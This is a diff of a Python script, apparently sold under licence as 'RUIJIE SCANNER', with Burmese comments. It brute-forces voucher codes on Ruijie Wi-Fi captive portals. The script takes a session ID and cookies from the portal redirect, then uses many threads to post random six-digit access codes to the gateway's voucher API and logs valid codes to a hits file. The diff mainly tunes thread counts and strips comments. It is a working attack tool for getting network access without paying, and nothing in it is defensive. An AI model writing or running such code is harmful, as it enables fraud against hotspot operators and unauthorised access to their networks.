@@ -15,18 +15,17 @@ RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]
 # ===============================
 # CONFIGURATION (Original)
 # ===============================
-RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
+RAW_KEY_URL = "https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
 if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
 else: DOWNLOAD_DIR = '/sdcard/Download'
 
-# .txt ကို hide ရန် အစက် (.) ထည့်ထားသည် (မူရင်းနေရာကို hide ရုံသာ)
 LICENSE_FILE = os.path.join(DOWNLOAD_DIR, '.license.txt')
 SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
 STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')
 
-NUM_THREADS = 200             
-SESSION_POOL_SIZE = 50        
-PER_SESSION_MAX = 300         
+NUM_THREADS = 150             
+SESSION_POOL_SIZE = 30        
+PER_SESSION_MAX = 200         
 CODE_LENGTH = 6 
 CHAR_SET = string.digits 
 
@@ -38,7 +37,6 @@ EXPIRY_STR = "N/A"
 DAYS_LEFT = "0"
 session_pool = Queue()
 valid_hits_data = [] 
-tried_codes = set()
 valid_lock = threading.Lock()
 file_lock = threading.Lock()
 DETECTED_BASE_URL = None
@@ -62,22 +60,22 @@ def get_hwid():
 def Draw_logo(step=0):
     os.system('clear')
     clr = RAINBOW[step % len(RAINBOW)]
-    print(f"""{clr}
+    # SyntaxWarning မတက်အောင် r""" သုံးထားသည်
+    print(fr"""{clr}
       .---.        .-----------.
-     /     \  __  /    v2.0     \\
-    / /     \(  )/               \\
-   //////   ' \/ `   RUIJIE       \\
+     /     \  __  /    v2.0     \
+    / /     \(  )/               \
+   //////   ' \/ `   RUIJIE       \
   //////    /    \   SCANNER      /
  //////    /      \              /
 '------'  '--------'------------'
 {W} OWNER : {C}{USER_NAME} {W}| EXP : {Y}{EXPIRY_STR} ({DAYS_LEFT} Days Left){RS}""")
 
-# --- [ VERIFY SYSTEM - FIXED USERNAME DISPLAY ] ---
+# --- [ VERIFY SYSTEM ] ---
 def verify():
     global USER_NAME, EXPIRY_STR, DAYS_LEFT
     hwid = get_hwid()
     now = datetime.now().date()
-    # Offline Check (.license.txt)
     if os.path.exists(LICENSE_FILE):
         try:
             with open(LICENSE_FILE, "r") as f:
@@ -91,7 +89,6 @@ def verify():
                     return True
                 else: os.remove(LICENSE_FILE)
         except: pass
-    # Online Check
     Draw_logo()
     try:
         print(f"{W}[*] Connecting to License Server...{RS}")
@@ -132,7 +129,7 @@ def select_mode():
     else: CODE_LENGTH = 6
     time.sleep(1)
 
- --- [ CORE LOGIC - FIXED SESSION & COOKIE ] ---
+# --- [ CORE LOGIC - FIXED SESSION & COOKIE ] ---
 def get_sid_from_gateway():
     global DETECTED_BASE_URL
     s = requests.Session()
@@ -140,21 +137,13 @@ def get_sid_from_gateway():
         'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
     })
     try:
-        # Step 1: Get Portal Redirect URL
         r1 = s.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=10)
         final_url = r1.url
-        
-        # Step 2: Handshake (Cookie ရအောင် Portal ကို တစ်ခါ အရင်သွားမယ်)
         s.get(final_url, timeout=10)
-        
         parsed = urlparse(final_url)
         DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
-        
-        # sessionId သို့မဟုတ် sid ကို ယူခြင်း
         query_params = parse_qs(parsed.query)
         sid = query_params.get('sessionId', [None])[0] or query_params.get('sid', [None])[0]
-        
-        # အရေးကြီးသည်: SID ကော Cookie ပါဝင်တဲ့ Session Object ကိုပါ ပြန်ပေးမယ်
         if sid:
             return {'sid': sid, 'session': s, 'p_url': final_url}
         return None
@@ -168,11 +157,11 @@ def session_refiller():
                 if data:
                     session_pool.put({
                         'sessionId': data['sid'], 
-                        'session_obj': data['session'], # Session ပါ သိမ်းထားမယ်
+                        'session_obj': data['session'],
                         'p_url': data['p_url'],
                         'left': PER_SESSION_MAX
                     })
-            time.sleep(1) # Gateway ကို အရမ်း stress မဖြစ်အောင်
+            time.sleep(1)
         except: time.sleep(2)
 
 def worker_thread():
@@ -185,22 +174,19 @@ def worker_thread():
             except Empty: continue
             
             sid = slot['sessionId']
-            s_obj = slot['session_obj'] # အရင်ရထားတဲ့ session ကို သုံးမယ်
+            s_obj = slot['session_obj']
             p_url = slot['p_url']
             
             code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
             CURRENT_CODE = code
             
-            # Header ထဲမှာ Referer အပြည့်ထည့်ခြင်းဖြင့် 404/Timeout ကျော်လွှားမယ်
             headers = {
                 'Referer': p_url,
                 'Content-Type': 'application/json;charset=UTF-8',
                 'X-Requested-With': 'XMLHttpRequest'
             }
             
-            # API endpoint ကို base url နဲ့ ပေါင်းစပ်ခေါ်ယူမယ်
             api_url = f"{DETECTED_BASE_URL}/api/auth/voucher/"
-            
             r = s_obj.post(api_url, 
                           json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                           headers=headers,
@@ -208,17 +194,14 @@ def worker_thread():
             
             TOTAL_TRIED += 1
             
-            # Response success ဖြစ်၊ မဖြစ် စစ်ဆေးခြင်း
             if '"success":true' in r.text.lower() or '"code":0' in r.text.lower():
                 limit_label = "Active"
-                # ... (Voucher limit တွက်ချက်တဲ့ အပိုင်းကို ဒီမှာ ထည့်နိုင်ပါတယ်) ...
                 with valid_lock:
                     valid_hits_data.append({"code": code, "hrs": limit_label})
                     TOTAL_HITS += 1
                     with open(SAVE_PATH, "a") as f:
                         f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
             
-            # Session timeout မဖြစ်သေးရင် ပြန်သုံးဖို့ queue ထဲ ပြန်ထည့်မယ်
             slot['left'] -= 1
             if slot['left'] > 0 and "Session timed out" not in r.text:
                 session_pool.put(slot)
